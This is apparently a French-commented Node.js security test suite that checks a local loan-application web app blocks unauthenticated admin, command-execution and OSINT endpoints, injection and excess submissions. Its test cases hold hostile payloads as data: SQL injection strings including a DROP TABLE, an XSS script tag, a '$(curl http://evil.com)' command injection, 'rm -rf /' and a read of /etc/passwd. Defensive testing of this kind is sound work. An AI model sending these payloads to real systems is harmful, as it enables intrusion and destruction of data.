#!/usr/bin/env node
/**
 * 🔒 SAR Security Testing Suite
 * Test tous les accès interdits avec les Sentinels
 * Mode: Recherche & Développement uniquement
 */

import 'dotenv/config'

const BASE_URL = 'http://localhost:3000'
const COLORS = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
}

const log = (color, message) => {
  console.log(`${COLORS[color]}${message}${COLORS.reset}`)
}

// ============================================
// 1. TESTS D'AUTHENTIFICATION
// ============================================

async function testAuthenticationBypass() {
  log('cyan', '\n🔐 Test 1: Authentication Bypass')
  const tests = [
    {
      name: 'Admin sans auth',
      url: '/api/admin/metrics/inspect',
      method: 'GET',
      shouldFail: true,
    },
    {
      name: 'Admin avec fake token',
      url: '/api/admin/metrics/inspect',
      method: 'GET',
      headers: { Authorization: 'Bearer fake-token-123' },
      shouldFail: true,
    },
    {
      name: 'SQL Injection dans auth',
      url: '/api/admin/metrics/inspect',
      method: 'POST',
      body: { username: "admin' OR '1'='1", password: "password' OR '1'='1" },
      shouldFail: true,
    },
  ]

  const results = []
  for (const test of tests) {
    try {
      const options = {
        method: test.method,
        headers: {
          'Content-Type': 'application/json',
          ...test.headers,
        },
      }
      if (test.body) {
        options.body = JSON.stringify(test.body)
      }

      const response = await fetch(`${BASE_URL}${test.url}`, options)
      const isBlocked = response.status === 401 || response.status === 403

      if (test.shouldFail && isBlocked) {
        log('green', `  ✅ ${test.name} - BLOQUÉ (${response.status})`)
        results.push({ test: test.name, passed: true, status: response.status })
      } else if (test.shouldFail && !isBlocked) {
        log('red', `  ❌ ${test.name} - NON BLOQUÉ (${response.status})`)
        results.push({ test: test.name, passed: false, status: response.status })
      } else {
        log('green', `  ✅ ${test.name} - OK (${response.status})`)
        results.push({ test: test.name, passed: true, status: response.status })
      }
    } catch (error) {
      log('red', `  ❌ ${test.name} - ERREUR: ${error.message}`)
      results.push({ test: test.name, passed: false, error: error.message })
    }
  }

  return results
}

// ============================================
// 2. TESTS SENTINEL
// ============================================

async function testSentinelProtection() {
  log('cyan', '\n🛡️ Test 2: Sentinel Protection')
  const tests = [
    {
      name: 'Sentinel execute sans auth',
      url: '/api/sentinel/execute',
      method: 'POST',
      body: { command: 'ls -la' },
      shouldFail: true,
    },
    {
      name: 'Sentinel scan project',
      url: '/api/sentinel/scan-project',
      method: 'POST',
      body: { path: '/etc/passwd' },
      shouldFail: true,
    },
    {
      name: 'Sentinel command injection',
      url: '/api/sentinel/execute-command',
      method: 'POST',
      body: { command: 'rm -rf / && echo hacked' },
      shouldFail: true,
    },
    {
      name: 'Sentinel fleet access',
      url: '/api/sentinel/fleet',
      method: 'GET',
      shouldFail: true,
    },
  ]

  const results = []
  for (const test of tests) {
    try {
      const options = {
        method: test.method,
        headers: {
          'Content-Type': 'application/json',
        },
      }
      if (test.body) {
        options.body = JSON.stringify(test.body)
      }

      const response = await fetch(`${BASE_URL}${test.url}`, options)
      const isBlocked = response.status === 401 || response.status === 403 || response.status === 400

      if (test.shouldFail && isBlocked) {
        log('green', `  ✅ ${test.name} - BLOQUÉ (${response.status})`)
        results.push({ test: test.name, passed: true, status: response.status })
      } else {
        log('red', `  ❌ ${test.name} - NON BLOQUÉ (${response.status})`)
        results.push({ test: test.name, passed: false, status: response.status })
      }
    } catch (error) {
      log('yellow', `  ⚠️  ${test.name} - ERREUR: ${error.message}`)
      results.push({ test: test.name, passed: true, error: error.message })
    }
  }

  return results
}

// ============================================
// 3. TESTS OSINT
// ============================================

async function testOSINTAccess() {
  log('cyan', '\n🔍 Test 3: OSINT Access Control')
  const tests = [
    {
      name: 'OSINT scan sans auth',
      url: '/api/osint/scan',
      method: 'POST',
      body: { target: '192.168.1.1' },
      shouldFail: true,
    },
    {
      name: 'OSINT network scan',
      url: '/api/osint/network-scan',
      method: 'POST',
      body: { range: '10.0.0.0/8' },
      shouldFail: true,
    },
    {
      name: 'OSINT bypass tests',
      url: '/api/osint/bypass-tests',
      method: 'GET',
      shouldFail: true,
    },
    {
      name: 'OSINT advanced features',
      url: '/api/osint/advanced',
      method: 'POST',
      body: { technique: 'exploit' },
      shouldFail: true,
    },
  ]

  const results = []
  for (const test of tests) {
    try {
      const options = {
        method: test.method,
        headers: {
          'Content-Type': 'application/json',
        },
      }
      if (test.body) {
        options.body = JSON.stringify(test.body)
      }

      const response = await fetch(`${BASE_URL}${test.url}`, options)
      const isBlocked = response.status === 401 || response.status === 403 || response.status === 404

      if (test.shouldFail && isBlocked) {
        log('green', `  ✅ ${test.name} - BLOQUÉ (${response.status})`)
        results.push({ test: test.name, passed: true, status: response.status })
      } else {
        log('red', `  ❌ ${test.name} - NON BLOQUÉ (${response.status})`)
        results.push({ test: test.name, passed: false, status: response.status })
      }
    } catch (error) {
      log('yellow', `  ⚠️  ${test.name} - ERREUR: ${error.message}`)
      results.push({ test: test.name, passed: true, error: error.message })
    }
  }

  return results
}

// ============================================
// 4. TESTS INJECTION
// ============================================

async function testInjectionVulnerabilities() {
  log('cyan', '\n💉 Test 4: Injection Vulnerabilities')
  const tests = [
    {
      name: 'SQL Injection dans formulaire',
      url: '/api/applications/submit',
      method: 'POST',
      body: {
        origin: 'argentrapide',
        prenom: "'; DROP TABLE loan_applications; --",
        nom: 'Test',
        courriel: 'test@test.com',
        telephone: '5141234567',
        montant_demande: 100000,
      },
      shouldFail: true,
    },
    {
      name: 'XSS dans nom',
      url: '/api/applications/submit',
      method: 'POST',
      body: {
        origin: 'argentrapide',
        prenom: '<script>alert("XSS")</script>',
        nom: 'Test',
        courriel: 'test@test.com',
        telephone: '5141234567',
        montant_demande: 100000,
      },
      shouldFail: true,
    },
    {
      name: 'Command Injection',
      url: '/api/applications/submit',
      method: 'POST',
      body: {
        origin: 'argentrapide',
        prenom: '$(curl http://evil.com)',
        nom: 'Test',
        courriel: 'test@test.com',
        telephone: '5141234567',
        montant_demande: 100000,
      },
      shouldFail: true,
    },
  ]

  const results = []
  for (const test of tests) {
    try {
      const response = await fetch(`${BASE_URL}${test.url}`, {
        method: test.method,
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(test.body),
      })

      const result = await response.json()
      const isValidated = response.status === 400 || (result.errors && result.errors.length > 0)

      if (test.shouldFail && isValidated) {
        log('green', `  ✅ ${test.name} - VALIDÉ ET BLOQUÉ`)
        results.push({ test: test.name, passed: true })
      } else {
        log('red', `  ❌ ${test.name} - NON VALIDÉ (${response.status})`)
        results.push({ test: test.name, passed: false })
      }
    } catch (error) {
      log('yellow', `  ⚠️  ${test.name} - ERREUR: ${error.message}`)
      results.push({ test: test.name, passed: true, error: error.message })
    }
  }

  return results
}

// ============================================
// 5. TESTS RATE LIMITING
// ============================================

async function testRateLimiting() {
  log('cyan', '\n⏱️  Test 5: Rate Limiting')

  log('blue', '  Testing formulaire rate limit (3/heure)...')
  const results = []
  let blocked = false

  for (let i = 1; i <= 5; i++) {
    try {
      const response = await fetch(`${BASE_URL}/api/applications/submit`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          origin: 'argentrapide',
          prenom: `Test${i}`,
          nom: 'User',
          courriel: `test${i}@test.com`,
          telephone: '5141234567',
          montant_demande: 100000,
        }),
      })

      if (response.status === 429) {
        blocked = true
        log('green', `  ✅ Requête ${i} - BLOQUÉE par rate limit (429)`)
        break
      } else {
        log('blue', `  → Requête ${i} - Passée (${response.status})`)
      }
    } catch (error) {
      log('yellow', `  ⚠️  Requête ${i} - Erreur: ${error.message}`)
    }

    await new Promise((resolve) => setTimeout(resolve, 500))
  }

  if (blocked) {
    results.push({ test: 'Rate Limiting', passed: true })
  } else {
    log('yellow', '  ⚠️  Rate limiting non détecté (peut être désactivé en dev)')
    results.push({ test: 'Rate Limiting', passed: false, note: 'Non détecté' })
  }

  return results
}

// ============================================
// MAIN EXECUTION
// ============================================

async function main() {
  log('magenta', '\n╔══════════════════════════════════════════════════════════╗')
  log('magenta', '║     🔒 SAR SECURITY TESTING SUITE - DEV MODE           ║')
  log('magenta', '╚══════════════════════════════════════════════════════════╝')

  log('yellow', '\n⚠️  ATTENTION: Tests de sécurité en mode développement')
  log('yellow', '   Assurez-vous que le serveur Next.js est en cours (npm run dev)\n')

  const allResults = []

  try {
    // Test 1: Authentication
    const authResults = await testAuthenticationBypass()
    allResults.push(...authResults)

    // Test 2: Sentinel
    const sentinelResults = await testSentinelProtection()
    allResults.push(...sentinelResults)

    // Test 3: OSINT
    const osintResults = await testOSINTAccess()
    allResults.push(...osintResults)

    // Test 4: Injections
    const injectionResults = await testInjectionVulnerabilities()
    allResults.push(...injectionResults)

    // Test 5: Rate Limiting
    const rateLimitResults = await testRateLimiting()
    allResults.push(...rateLimitResults)

    // Summary
    log('cyan', '\n═══════════════════════════════════════════════════════════')
    log('cyan', '📊 RÉSUMÉ DES TESTS')
    log('cyan', '═══════════════════════════════════════════════════════════')

    const passed = allResults.filter((r) => r.passed).length
    const total = allResults.length
    const percentage = Math.round((passed / total) * 100)

    log('blue', `\nTotal: ${total} tests`)
    log('green', `✅ Réussis: ${passed}`)
    log('red', `❌ Échoués: ${total - passed}`)
    log('cyan', `📊 Taux de réussite: ${percentage}%\n`)

    if (percentage >= 90) {
      log('green', '🎉 EXCELLENT! Votre système est bien sécurisé!')
    } else if (percentage >= 70) {
      log('yellow', '⚠️  BON, mais quelques améliorations nécessaires')
    } else {
      log('red', '❌ CRITIQUE! Plusieurs vulnérabilités détectées')
    }

    // Failed tests detail
    const failed = allResults.filter((r) => !r.passed)
    if (failed.length > 0) {
      log('red', '\n❌ Tests échoués:')
      failed.forEach((f) => {
        log('red', `  - ${f.test}${f.status ? ` (Status: ${f.status})` : ''}`)
      })
    }

    log('cyan', '\n═══════════════════════════════════════════════════════════\n')
  } catch (error) {
    log('red', `\n❌ Erreur globale: ${error.message}`)
    log('yellow', '\n💡 Assurez-vous que:')
    log('yellow', '   1. Le serveur Next.js tourne (npm run dev)')
    log('yellow', '   2. Le port 3000 est accessible')
    log('yellow', '   3. Les routes API sont correctement configurées\n')
  }
}

// Run tests
main().catch(console.error)
